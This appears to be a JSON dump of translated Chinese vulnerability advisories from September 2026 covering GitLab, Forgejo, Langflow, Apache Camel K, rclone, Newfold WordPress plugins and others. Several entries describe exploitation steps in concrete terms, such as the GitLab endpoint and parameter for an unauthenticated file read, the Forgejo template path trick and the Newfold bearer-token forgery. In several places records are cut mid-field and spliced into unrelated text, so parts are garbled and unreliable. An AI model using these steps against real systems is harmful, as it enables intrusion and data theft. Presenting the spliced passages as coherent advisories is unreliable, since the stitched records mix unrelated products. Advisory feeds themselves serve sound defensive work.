"https://github.com/maxsite/cms/blob/2ca0a0c7d1d71106a25dbb0f2aedaaefbf12802c/system/libraries/Session.php#L740-L742", "name": ""}, {"url": "https://github.com/EviL0rd/maxsite-cve4/blob/main/2026.09.08-maxsite-cms-hardcoded-session-key-auth-bypass.md", "name": ""}, {"url": "https://github.com/maxsite/cms/blob/2ca0a0c7d1d71106a25dbb0f2aedaaefbf12802c/application/config/config.php#L230-L254", "name": ""}, {"url": "https://www.vulncheck.com/advisories/maxsite-cms-through-109.6-php-object-injection-via-ci-session", "name": "VulnCheck Advisory: MaxSite CMS through 109.6 PHP Object Injection via ci_session"}], "scope_influence": "", "tags": ["应用软件"], "title": "MaxSite CMS 通过 ci_session 通过 109.6 PHP 对象注入", "_translated": true, "_saved_at": "2026-09-09T18:22:33+00:00", "_first_saved_at": "2026-09-09T18:22:33+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-b6ul-ptjk"}, {"analysis_status": 0, "articles": [{"content": "应用程序在处理用户输入时的不完善或缺乏验证机制，所以攻击者能够通过向应用程序发送恶意输入，利用应用程序对输入数据的错误处理方式来注入自己的恶意代码。这些恶意代码会被应用程序误认为是合法的指令或数据，并在执行过程中被执行。", "title": "什么是代码注入"}, {"content": "应用程序使用可执行动态代码的函数来执行用户可控的参数，当应用程序对于用户输入过滤不完全时，攻击者可以注入恶意代码并控制代码执行流程。", "title": "代码注入常见的攻击方式"}, {"content": "- 输入验证与过滤：应用程序应该对所有用户输入进行验证和过滤，确保只接受预期的有效输入。这包括对输入数据进行输入长度验证、类型检查和格式验证等。\r\n- 使用参数化查询或预编译语句：对于数据库查询操作，应该使用参数化查询或预编译语句，确保输入数据不会被误认为是执行代码。\r\n- 最小特权原则：应用程序在执行操作系统命令或动态代码时，应该使用最小特权原则，即使用具有最低权限的用户或服务来执行操作。\r\n- 安全编码实践：开发人员应该采用安全编码实践，包括避免使用eval函数、避免拼接用户输入的字符串作为代码执行等。\r\n- 使用Web应用程序防火墙（WAF）：部署Web应用程序防火墙可以帮助检测和阻止代码注入攻击。", "title": "如何预防代码注入"}], "cnvd_id": "", "cve_id": "CVE-2026-80352", "cvss": {}, "cvss_score": 9.2, "cvss_vector": "", "cwe": "CWE-94", "description": "Apache Camel K 是 Apache 软件基金会开源的 Kubernetes 云原生集成运行时，以 Operator 形式部署在集群中，负责管理 Integration 自定义资源并生成配套的 RBAC 资源。\n受影响版本中，Operator 处理 master trait 时将 Integration 自定义资源 spec.serviceAccountName 中的服务账号名未经格式校验直接填入 RoleBinding YAML 模板的 subjects.name 字段，持有 CR 编写权限的用户在该字段注入换行符等 YAML 语法字符后可追加任意 Kubernetes 对象文档，Operator 以自身权限应用渲染后的多文档 YAML，导致以其权限在集群中创建任意资源。\n修复版本中通过在 prepareRBAC 中增加 k8s.io/apimachinery 的 IsDNS1123Subdomain 校验，服务账号名不符合 DNS-1123 子域格式时直接返回错误，阻断非法字符进入 YAML 模板，消除以 Operator 权限创建任意对象的路径。", "effects": [{"comp_name": "camel_k", "ecosystem": "linux", "versions": [{"affected_version": "[2.0.0,2.9.3)", "min_fixed_version": "2.9.3", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[2.10.0,2.10.2)", "min_fixed_version": "2.10.2", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "代码注入", "kind_en": "代码生成控制不当（“代码注入”）", "last_modified_time": "2026-09-10", "level": "Critical", "mps_id": "MPS-e3eb-97e0", "poc": false, "poc_url": [], "published_time": "2026-09-10", "reference_url_list": [{"url": "http://www.mail-archive.com/announce@apache.org/msg11868.html", "name": ""}, {"url": "https://camel.apache.org/security/CVE-2026-80352.html", "name": ""}, {"url": "https://github.com/apache/camel-k/pull/6785", "name": ""}, {"url": "https://github.com/apache/camel-k/commit/021f4baa7678e6244077ae7fb0edb41a3543757c", "name": ""}, {"url": "https://github.com/apache/camel-k/commit/f0659822418eb3c0ab2b2090a797d7f0b8275763", "name": ""}, {"url": "https://www.cve.org/CVERecord?id=CVE-2026-80352", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "Apache Camel K YAML 注入漏洞", "_translated": true, "_saved_at": "2026-09-10T07:46:31+00:00", "_first_saved_at": "2026-09-10T07:46:31+00:00", "_source_page": "https://www.oscs1024. ved_at": "2026-09-11T14:47:31+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-9wpe-3x5a"}, {"analysis_status": 3, "articles": [{"content": "攻击者可以通过构造特定的输入来绕过应用程序对文件路径的验证，进而访问应用程序之外的文件或目录。这种漏洞通常出现在应用程序根据用户提供的输入来确定文件路径的场景中，如文件下载、文件读取或包含其他文件的操作。", "title": "什么是路径遍历"}, {"content": "- 字符串拼接：攻击者提供包含特殊字符的文件路径，以获取目标文件系统中的敏感文件。例如，攻击者可以使用\"../\"表示向上导航到上层目录，然后获取目标目录中的文件。\n- NULL字节攻击：攻击者通过插入空字节（\\0）来截断文件路径，绕过应用程序的路径检查。这种攻击通常针对使用C/C++编程语言的应用程序，因为C字符串是以NULL字节结尾的。\n- 编码绕过攻击：攻击者可以尝试使用特殊编码（如URL编码、Unicode编码）绕过输入验证，使应用程序无法正确解析文件路径，从而实现路径遍历。", "title": "路径遍历常见的攻击方式"}, {"content": "- 输入验证和过滤：应该对所有从用户输入或不可信来源获取的文件路径进行验证和过滤。确保输入只包含允许的字符，并且没有包含特殊字符或路径导航符号。\n- 白名单验证：使用白名单机制来限制文件路径的选择范围。只允许用户访问应用程序所需的特定目录或文件，拒绝访问其他目录或文件。\n- 完整的路径解析：在构造文件路径时，使用完整的路径解析方法，以确保路径的正确性和合法性。避免使用相对路径或不完整的路径。\n- 限制访问权限：确保应用程序和服务器的文件系统设置正确，限制应用程序只能访问必要的文件和目录。使用操作系统级别的文件系统权限控制来限制访问权限。\n- 安全编码实践：开发人员应遵循安全的编码实践，如使用安全的API和框架、避免拼接用户输入和文件路径、不信任用户输入等。", "title": "如何预防路径遍历"}], "cnvd_id": "", "cve_id": "CVE-2026-85706", "cvss": {"cvssv31": [{"source": "murphysec", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N", "severity": "critical", "base_score": 10}]}, "cvss_score": 10, "cvss_vector": "", "cwe": "CWE-22", "description": "GitLab 是开源 DevSecOps 平台，Community Edition 与 Enterprise Edition 均提供仓库托管、CI/CD 与项目管理，并对外暴露 repository commits REST API。\n受影响版本中，Workhorse 只按正则 ^/api/v4/projects/[^/]+/repository/commits\\z 改写上传元数据，未认证 POST 使用 /api/v4/projects/:id/repository/commits/ 或 .../commits.json 即可避开改写。公开项目上 before 过滤器仅执行 authorize_read_code!，创建提交入口没有 authenticate!，file_params_from_body_upload 把攻击者可控的 params['file.path'] 当作本地路径并调用 File.exist?、File.read、Oj.load_file。application/x-www-form-urlencoded 解析失败时还会把文件原文写入 HTTP 400 响应，未认证攻击者可读取 GitLab 服务器上的密钥、配置与业务数据，形成任意文件读取漏洞。\n修复版本中通过在 authorize 与创建入口补上 authenticate!，并只信任中间件生成的 UploadedFile，使未认证请求在读取文件前被拒绝，响应不再回显文件内容。", "effects": [{"comp_name": "gitlab", "ecosystem": "linux", "versions": [{"affected_version": "[19.2,19.2.6)", "min_fixed_version": "19.2.6", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[18.7,19.1.8)", "min_fixed_version": "19.1.8", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[19.3,19.3.2)", "min_fixed_version": "19.3.2", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "极高", "fix_suggestion": "建议修复", "kind": "路径遍历", "kind_en": "对受限制目录的路径名的不正确限制（“路径遍历”）", "last_modified_time": "2026-09-11", "level": "Critical", "mps_id": "MPS-rwqe-01ix", "poc": true, "poc_url": [], "published_time": "2026-09-11", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-rwqe-01ix", "name": "https://www.oscs1024.com/hd/MPS-rwqe-01ix"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-85706", "name": ""}, {"url": "https://docs.gitlab.com/releases/patches/patch-release-gitlab-19-3-2-released/", "name": ""}, {"url": "https://github.com/gitlabhq/gitlabhq/commit/e986c922de87f9c685ba9d063c90f3c04a1195ac", "name": ""}], "scope_influence": "广", "tags": ["poc", "专家校准", "应用软件"], "title": "GitLab仓库提交API未授权任意文件读取漏洞", "_translated": true, "_saved_at": "2026-09-11T05:32:02+00:00", "_first_saved_at": "2026-09-11T05:32:02+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-rwqe-01ix"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-89094", "cvss": {"cvssv31": [{"source": "cve@mitre.org", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H", "severity": "critical", "base_score": 9.9}]}, "cvss_score": 9.9, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H", "cwe": "CWE-1336", "description": "Forgejo 是由 Codeberg 社区基于 Gitea 分支开发的开源自托管代码协作平台，提供仓库托管、代码评审与 CI/CD 等功能，采用 Go 语言编写并以 MIT 许可证发布。\n受影响版本中，用户以模板仓库创建新仓库时，服务端克隆模板仓库、删除 .git 目录后读取 .forgejo/template 中列出的 glob 并对匹配文件执行变量模板扩展，文件路径本身同样参与扩展且扩展后未再次清理 .git 目录；攻击者在模板仓库中放置名为 .g${REPO_NAME}/config 的文件并在 .forgejo/template 中列出 .g*/config，将新仓库命名为 it 使该路径扩展为 .git/config，git init 初始化新仓库时沿用该目录中攻击者构造的 git 配置，随后的 git add、git commit、git push 以 Forgejo 进程权限执行，攻击者可借此在宿主机上执行任意进程并读取任意数据。\n修复版本中通过在模板变量扩展完成后、git 仓库初始化之前删除临时目录中已存在的 .git 目录，切断扩展产物进入 git 初始化的路径，使恶意模板仓库无法再植入 git 配置，消除任意进程执行与任意数据读取风险。", "effects": [{"comp_name": "forgejo.org", "ecosystem": "go", "versions": [{"affected_version": "(-∞,15.0.8)", "min_fixed_version": "15.0.8", "repository": "go", "solutions": [], "upstream": true}, {"affected_version": "[16.0.0,16.0.4)", "min_fixed_version": "16.0.4", "repository": "go", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "模板注入", "kind_en": "模板引擎中使用的特殊元素的不正确中和", "last_modified_time": "2026-09-11", "level": "Critical", "mps_id": "MPS-ln3s-igfr", "poc": false, "poc_url": [], "published_time": "2026-09-11", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-ln3s-igfr", "name": "https://www.oscs1024.com/hd/MPS-ln3s-igfr"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-89094", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-89094"}, {"url": "https://news.ycombinator.com/item?id=49645907", "name": ""}, {"url": "https://codeberg.org/forgejo/forgejo/milestone/139655", "name": ""}], "scope_influence": "", "tags": ["go"], "title": "Forgejo 模板仓库生成远程代码执行漏洞", "_translated": true, "_saved_at": "2026-09-10T22:11:12+00:00", "_first_saved_at": "2026-09-10T22:11:12+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-ln3s-igfr"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-84390", "cvss": {"cvssv31": [{"source": "psirt@fortinet.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "critical", "base_score": 9.8}]}, "cvss_score": 9.8, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-540", "description": "FortiMonitorOnSight web portal 是 Fortinet FortiMonitor 基础设施监控方案中 OnSight 采集设备（OnSight 100F）的 Web 管理控制台，用于配置采集任务并查看监控数据，属于 户对程序中的不同资源的访问权限。ACL 通常由用户名、权限和资源地址组成，可以确保只有授权用户才能访问程序中的重要数据或资源。\n- 使用访问令牌：使用访问令牌可以确保只有授权用户才能访问程序中的不同资源。令牌通常由用户 ID、权限和资源地址组成，可以确保只有授权用户才能更改令牌的权限。\n- 使用安全审计：在程序中记录安全审计日志，可以确保管理员可以追踪未授权用户的活动。同时，定期审查安全审计日志，可以及时发现未授权的活动并采取相应的措施。\n- 最小特权原则：程序应该限制用户输入的数据的权限，只允许授权用户进行特定的操作，以减少未授权用户对受保护资源或数据的访问。\n- 输入验证：程序应该对用户输入的数据进行适当的验证和过滤，以确保输入的数据符合预期的格式和类型。\n- 安全编码实践：程序应该遵循一些安全编码实践，如使用安全的算法和加密机制、避免使用未认证的库和框架、避免使用默认设置等，以减少漏洞的出现。\n", "title": "如何预防授权检查错误"}], "cnvd_id": "", "cve_id": "CVE-2026-85025", "cvss": {"cvssv31": [{"source": "psirt@us.ibm.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "critical", "base_score": 9.8}]}, "cvss_score": 9.8, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-863", "description": "Langflow 是 IBM 开源的 LLM 应用可视化构建框架，用于编排大模型工作流与智能体，并支持把项目内的流程以 MCP（Model Context Protocol）服务端点的形式对外发布。\n受影响版本中，以公开（无需凭证）方式分享的项目 MCP 端点在处理工具调用时，api/v1/mcp_utils.py 的 handle_call_tool 直接执行数据库中存储的流程图，未运行公共流程必需的代码执行校验 validate_public_flow_no_code_execution 与可信组件源替换 prepare_public_flow_build，敏感字段值未清洗，匿名调用以解析出的项目所有者身份运行；调用方提交的 session_id 未经隔离直接用于聊天消息存取，未认证攻击者可借公开 MCP 项目端点触发任意代码执行，并访问或修改该流程下其他用户的聊天会话。\n修复版本中通过在公开 MCP 调用路径引入统一的匿名流程防护：先以 validate_public_flow_no_code_execution 拒绝携带代码执行组件的流程，再以 prepare_public_flow_build 替换为服务端可信组件源并以 strip_secret_field_values 清洗敏感字段，匿名调用改由 _public_mcp_execution_user 返回的固定匿名主体执行，session_id 经 _public_mcp_session_namespace 与 scope_session_to_namespace 限定到 MCP 连接与流程命名空间，从而阻断任意代码执行与会话越权访问。", "effects": [{"comp_name": "langflow", "ecosystem": "pip", "versions": [{"affected_version": "[1.0.0,1.11.6)", "min_fixed_version": "1.11.6", "repository": "pip", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "授权检查错误", "kind_en": "授权错误", "last_modified_time": "2026-09-11", "level": "Critical", "mps_id": "MPS-g4ac-b5ul", "poc": false, "poc_url": [], "published_time": "2026-09-11", "reference_ files/年/月 目录并在响应中返回 file_url，攻击者可上传 .php 等可执行文件，在 Web 服务器解析该目录 PHP 的环境下可导致远程代码执行。\n修复版本中通过在 mipl_wc_upload_file 中新增 $allowed_mimes 文件类型白名单并调用 wp_check_filetype_and_ext 校验上传文件的真实扩展名与 MIME 类型，校验失败时终止请求，同时将 upload_file_data 路由的 permission_callback 改为要求已登录用户且通过 wp_rest nonce 校验，自 1.2.3 起从入口阻断未认证任意文件上传。", "effects": [{"comp_name": "mipl-wc-checkout-fields", "ecosystem": "linux", "versions": [{"affected_version": "[1.2.0,1.2.3)", "min_fixed_version": "1.2.3", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "任意文件上传", "kind_en": "危险类型文件无限制上传", "last_modified_time": "2026-09-11", "level": "Critical", "mps_id": "MPS-pg8l-6z2w", "poc": false, "poc_url": [], "published_time": "2026-09-11", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-pg8l-6z2w", "name": "https://www.oscs1024.com/hd/MPS-pg8l-6z2w"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-8778", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-8778"}, {"url": "https://www.wordfence.com/threat-intel/vulnerabilities/id/ac1257a9-7c8e-43aa-b21a-93a77b456aa4?source=cve", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/mipl-wc-checkout-fields/tags/1.2.1/mipl-wc-checkout-fields.php#L260", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/mipl-wc-checkout-fields/trunk/mipl-wc-checkout-fields.php#L260", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/mipl-wc-checkout-fields/tags/1.2.1/include/class-mipl-wc-cf-checkout-block.php#L415", "name": ""}, {"url": "https://plugins.trac.wordpress.org/browser/mipl-wc-checkout-fields/trunk/include/class-mipl-wc-cf-checkout-block.php#L415", "name": ""}, {"url": "https://plugins.trac.wordpress.org/changeset?sfp_email=\u0026sfph_mail=\u0026reponame=\u0026new=3552029%40mipl-wc-checkout-fields%2Ftrunk%2Finclude%2Fclass-mipl-wc-cf-checkout-block.php\u0026old=3549283%40mipl-wc-checkout-fields%2Ftrunk%2Finclude%2Fclass-mipl-wc-cf-checkout-block.php\u0026sfp_email=\u0026sfph_mail=", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "MIPL WooCommerce插件任意文件上传漏洞", "_translated": true, "_saved_at": "2026-09-11T05:32:05+00:00", "_first_saved_at": "2026-09-11T05:32:05+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-pg8l-6z2w"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-88018", "cvss": {"cvssv31": [{"source": "security-advisories@github.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "critical", "base_score": 9.8}]}, "cvss_score": 9.8, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-306", "description": "rclone 是一个命令行程序，用于在不同的云存储提供商之间同步文件和目录。在 1.75.1 之前，rclone 服务 s3 配置了 --auth-proxy 但没有 --auth-key，允许 authPairMiddleware 使用空的 ws.s3Secret 注册任何客户端选择的 accessKeyID。然后，gofakes3 根据相同的空密钥验证请求的 SigV4 签名，而 Server.auth 将访问密钥标识符作为用户和身份验证值传递给代理，而无需独立的每个身份密钥。因此，未经身份验证的网络攻击者可以选择任意访问密钥，使用空密钥进行签名，并到达身份验证代理脚本为该身份解析的任何后端。此问题已在版本 1.75.1 中修复。", "effects": [{"comp_name": "rclone", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,1.75.1)", "min_fixed_version": "1.75.1", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "关键功能的认证机制缺失", "kind_en": "缺少关键功能的身份验证", "last_modified_time": "2026-09-11", "level": "Critical", "mps_id": "MPS-uq1n-v84r", "poc": false, "poc_url": [], "published_time": "2026-09-11", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-uq1n-v84r", "name": "https://www.oscs1024.com/hd/MPS-uq1n-v84r"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-88018", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-88018"}, {"url": "https://github.com/rclone/rclone/security/advisories/GHSA-xwwr-4h3p-r22c", "name": "https://github.com/rclone/rclone/security/advisories/GHSA-xwwr-4h3p-r22c"}, {"url": "https://github.com/rclone/rclone/commit/90595f34f27f569be6b27c57fe5ab65057d323bd", "name": "https://github.com/rclone/rclone/commit/90595f34f27f569be6b27c57fe5ab65057d323bd"}, {"url": "https://github.com/rclone/rclone/releases/tag/v1.75.1", "name": "https://github.com/rclone/rclone/releases/tag/v1.75.1"}], "scope_influence": "", "tags": [], "title": "CVE-2026-88018漏洞", "_translated": true, "_saved_at": "2026-09-10T16:50:52+00:00", "_first_saved_at": "2026-09-10T16:50:52+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-uq1n-v84r"}, {"analysis_status": 0, "articles": [{"content": "应用程序在进行身份验证时使用了不恰当的机制或实施不安全的验证方法。这可能包括使用未限制登录次数、使用不安全的会话管理、缺乏多因素身份验证等。攻击者可以利用这些弱点来绕过身份验证，冒充合法用户，获取未授权的访问权限。", "title": "什么是身份验证不当"}, {"content": "- 密码破解：攻击者尝试使用暴力破解或字典攻击等方法，通过尝试各种密码组合来猜测合法用户的密码。如果应用程序没有限制登录次数并使用弱密码或密码哈希算法，攻击者可以成功地破解密码并获取访问权限。\r\n- 会话劫持：攻击者通过获取合法用户的会话标识符（如Cookie）来劫持其会话。这可以通过窃取会话标识符、使用会话固定攻击或通过 XSS 等方式实现。一旦攻击者获得有效的会话，他们可以冒充合法用户执行未经授权的操作。\r\n- CSRF攻击：攻击者通过欺骗受害者利用其身份在已登录的应用程序中执行恶意操作。这种攻击利用了应用程序在处理来自受信任网站的请求时未进行适当验证的漏洞。", "title": "身份验证不当常见的攻击方式"}, {"content": "- 使用强密码策略：应用程序应该要求用户使用强密码，并通过密码复杂性要求、密码长度限制等措施来确保密码的强度。\r\n- 密码哈希和盐值：应用程序应该使用适当的密码哈希算法，并为每个用户生成唯一的盐值。这样可以防止攻击者通过哈希碰撞或彩虹表攻击破解密码。\r\n- 多因素身份验证：应用程序可以引入多因素身份验证，结合密码与其他因素（如指纹、短信验证码、硬件令牌等）来提高安全性。\r\n- 安全的会话管理：使用安全的会话管理机制，如随机生成会话标识符、在会话过期时强制重新验证等，以防止会话劫持攻击。\r\n- 输入验证与过滤：在进行身份验证之前，应该对用户输入进行适当的验证和过滤，以防止 XSS 和其他攻击。\r\n- 定期安全审计：进行定期的安全审计和漏洞扫描，及时修复发现的安全问题。", "title": "如何预防身份验证不当"}], "cnvd_id": "", "cve_id": "CVE-2026-82107", "cvss": {"cvssv31": [{"source": "psirt@us.ibm.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N", "severity": "critical", "base_score": 9.6}]}, "cvss_score": 9.6, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N", "cwe": "CWE-287", "description": "IBM DataStage on Cloud Pak for Data 是 IBM 推出的商业数据集成组件，部署在 IBM Software Hub（Cloud Pak for Data）平台之上，用于企业级数据的抽取、转换与加载处理。\n受影响版本中，组件的身份认证机制处理不当，远程攻击者持有有效的认证账号即可绕过安全限制并获取敏感信息，导致敏感信息泄露与安全策略失效（CWE-287）。\n修复版本中通过修正身份认证校验处理消除该安全限制绕过风险，官方要求受影响用户升级至 5.4 patch 5 或更高版本。", "effects": [{"comp_name": "datastage_on_cloud_pak_for_data", "ecosystem": "linux", "versions": [{"affected_version": "[5.4.0.0,5.4 patch 5)", "min_fixed_version": "5.4 patch 5", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "身份验证不当", "kind_en": "认证不当", "last_modified_time": "2026-09-11", "level": "Critical", "mps_id": "MPS-v4mq-t0r1", "poc": false, "poc_url": [], "published_time": "2026-09-11", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-v4mq-t0r1", "name": "https://www.oscs1024.com/hd/MPS-v4mq-t0r1"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82107", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-82107"}, {"url": "https://www.ibm.com/support/pages/node/7286562", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "IBM DataStage 身份认证绕过漏洞", "_translated": true, "_saved_at": "2026-09-11T00:46:07+00:00", "_first_saved_at": "2026-09-11T00:46:07+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-v4mq-t0r1"}, {"analysis_status": 0, "articles": [{"content": "攻击者可以通过构造特定的输入来绕过应用程序对文件路径的验证，进而访问应用程序之外的文件或目录。这种漏洞通常出现在应用程序根据用户提供的输入来确定文件路径的场景中，如文件下载、文件读取或包含其他文件的操作。", "title": "什么是路径遍历"}, {"content": "- 字符串拼接：攻击者提供包含特殊字符的文件路径，以获取目标文件系统中的敏感文件。例如，攻击者可以使用\"../\"表示向上导航到上层目录，然后获取目标目录中的文件。\n- NULL字节攻击：攻击者通过插入空字节（\\0）来截断文件路径，绕过应用程序的路径检查。这种攻击通常针对使用C/C++编程语言的应用程序，因为C字符串是以NULL字节结尾的。\n- 编码绕过攻击：攻击者可以尝试使用特殊编码（如URL编码、Unicode编码）绕过输入验证，使应用程序无法正确解析文件路径，从而实现路径遍历。", "title": "路径遍历常见的攻击方式"}, {"content": "- 输入验证和过滤：应该对所有从用户输入或不可信来源获取的文件路径进行验证和过滤。确保输入只包含允许的字符，并且没有包含特殊字符或路径导航符号。\n- 白名单验证：使用白名单机制来限制文件路径的选择范围。只允许用户访问应用程序所需的特定目录或文件，拒绝访问其他目录或文件。\n- 完整的路径解析：在构造文件路径时，使用完整的路径解析方法，以确保路径的正确性和合法性。避免使用相对路径或不完整的路径。\n- 限制访问权限：确保应用程序和服务器的文件系统设置正确，限制应用程序只能访问必要的文件和目录。使用操作系统级别的文件系统权限控制来限制访问权限。\n- 安全编码实践：开发人员应遵循安全的编码实践，如使用安全的API和框架、避免拼接用户输入和文件路径、不信任用户输入等 Cookie）来劫持其会话。这可以通过窃取会话标识符、使用会话固定攻击或通过 XSS 等方式实现。一旦攻击者获得有效的会话，他们可以冒充合法用户执行未经授权的操作。\r\n- CSRF攻击：攻击者通过欺骗受害者利用其身份在已登录的应用程序中执行恶意操作。这种攻击利用了应用程序在处理来自受信任网站的请求时未进行适当验证的漏洞。", "title": "身份验证不当常见的攻击方式"}, {"content": "- 使用强密码策略：应用程序应该要求用户使用强密码，并通过密码复杂性要求、密码长度限制等措施来确保密码的强度。\r\n- 密码哈希和盐值：应用程序应该使用适当的密码哈希算法，并为每个用户生成唯一的盐值。这样可以防止攻击者通过哈希碰撞或彩虹表攻击破解密码。\r\n- 多因素身份验证：应用程序可以引入多因素身份验证，结合密码与其他因素（如指纹、短信验证码、硬件令牌等）来提高安全性。\r\n- 安全的会话管理：使用安全的会话管理机制，如随机生成会话标识符、在会话过期时强制重新验证等，以防止会话劫持攻击。\r\n- 输入验证与过滤：在进行身份验证之前，应该对用户输入进行适当的验证和过滤，以防止 XSS 和其他攻击。\r\n- 定期安全审计：进行定期的安全审计和漏洞扫描，及时修复发现的安全问题。", "title": "如何预防身份验证不当"}], "cnvd_id": "", "cve_id": "CVE-2026-80099", "cvss": {"cvssv31": [{"source": "security@wordfence.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.8}]}, "cvss_score": 8.8, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-287", "description": "多个 Newfold 插件容易遭到身份验证绕过。该漏洞的存在是因为插件捆绑了 wp-module-data 模块。在该模块中，“authenticate()”方法（在“rest_authentication_errors”过滤器上注册，因此对每个未经身份验证的 REST API 请求进行评估）执行 HMAC 风格的 Bearer 令牌比较，当“HiiveConnection::get_auth_token()”返回“false”时，该比较会退化：PHP 将“strrev(false)”强制为“strrev('')”，将秘密盐折叠为公开的盐常量 `hash('sha256', '') = e3b0c44...`，而所有剩余的哈希输入（HTTP 方法、请求 URL、原始请求正文和 `X-Timestamp` 标头）仍然完全由攻击者控制。这使得未经身份验证的攻击者可以完全离线计算有效的 Bearer 令牌，通过令牌相等性检查，并对 get_users(['role' =\u003e 'administrator'])` 返回的第一个管理员调用 `wp_set_current_user()`，授予完全管理员级别的访问权限并启用任意 REST API 操作，例如创建新的管理员帐户和实现完全站点接管。易受攻击的版本为WP Plugin Crazy Domains (\u003c= 2.5.2)、WP Plugin Web (\u003c= 2.3.4)、WP Plugin Hostgator (\u003c= 3.1.0)、WP Plugin Bluehost (\u003c= 4.17.1)。受影响的模块在 2.9.4 及以下版本中容易受到攻击。", "effects": [{"comp_name": "WP Module Data", "ecosystem": "linux", "versions": [{"affected_version": "(0,2.9.7]", "min_fixed_version": "", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "WP Plugin Bluehost", "ecosystem": "linux", "versions": [{"affected_version": "(0,4.19.0]", "min_fixed_version": "", "repository": "unmanaged", "solutio sion": "10.0.26100.9445", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "堆缓冲区溢出", "kind_en": "基于堆的缓冲区溢出", "last_modified_time": "2026-09-09", "level": "High", "mps_id": "MPS-ub52-v610", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-ub52-v610", "name": "https://www.oscs1024.com/hd/MPS-ub52-v610"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-85877", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-85877"}, {"url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-85877", "name": "Windows Print Spooler Remote Code Execution Vulnerability"}], "scope_influence": "", "tags": ["操作系统"], "title": "Windows打印后台处理程序远程代码执行漏洞", "_translated": true, "_saved_at": 